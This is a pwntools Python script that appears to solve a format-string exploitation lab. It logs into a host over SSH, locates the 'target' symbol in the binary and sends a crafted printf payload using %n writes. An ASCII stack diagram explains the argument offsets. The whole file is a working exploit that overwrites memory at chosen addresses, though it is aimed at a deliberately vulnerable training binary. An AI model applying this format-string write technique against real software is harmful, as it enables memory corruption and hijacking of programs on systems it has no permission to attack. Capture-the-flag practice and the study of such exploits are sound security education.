from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
target_addr = e.symbols['target']
log.info('target_addr: %08x', target_addr)

'''
      .
      .
      +================ (printf)
      | printfbuffer+X
      +---------------- <-- sp_printbuffer     ($0)
      | buf ptr         o-------------------.
 0x18 |----------------                     |   $1
      |     ...                             |   ..
      +---------------- <-- bp_printbuffer  |   $6
  4   | bp_vuln                             |
      +================ (printbuffer)       |   $7
  4   | vuln+X                              |
      +---------------- <-- sp_vuln         |   $8
  4   | buf ptr         o--.                |
      |----------------    |                |   $9
  4   | size (512)         |                |
      |----------------    |                |  $10
  4   | stream (stdin)     |                |
      |----------------    |                |  $11
  4   |     ...            |                |
      +---------------- <--'----------------'  $12
0x208 | buf
      +---------------- <-- bp_vuln
      | bp_main
      +================ (vuln)
  ?   |     ...
      `---------------- 0xbfffffff (stack)

'''

idx = 12  # payload index for printf
nidx = lambda i: '%' + str(idx + i) + '$n'  # helper to focus on the addresses at the beginning of the payload
payload = p32(target_addr) + p32(target_addr + 1) + p32(target_addr + 2)  # first digit is far away (0x44), so we can fit the write addresses first
payload += cyclic(0x38) + nidx(0)  # digit 0x44, offseted by the 3 target addresses in the payload
payload += cyclic(0x11) + nidx(1)  # digit 0x55, adjusted from the 0x44 already printed char
payload += cyclic(0xad) + nidx(2)  # d-digit 0x0102 adjusted to the 0x55 already printed. Note: splitting in 2 digits would bring too much problems
payload += '\n'

with s.system(args.BIN) as p:
    p.sendline(payload)
    p.recvline()
    ret = p.recvline()
    assert ret == 'you have modified the target :)\n'
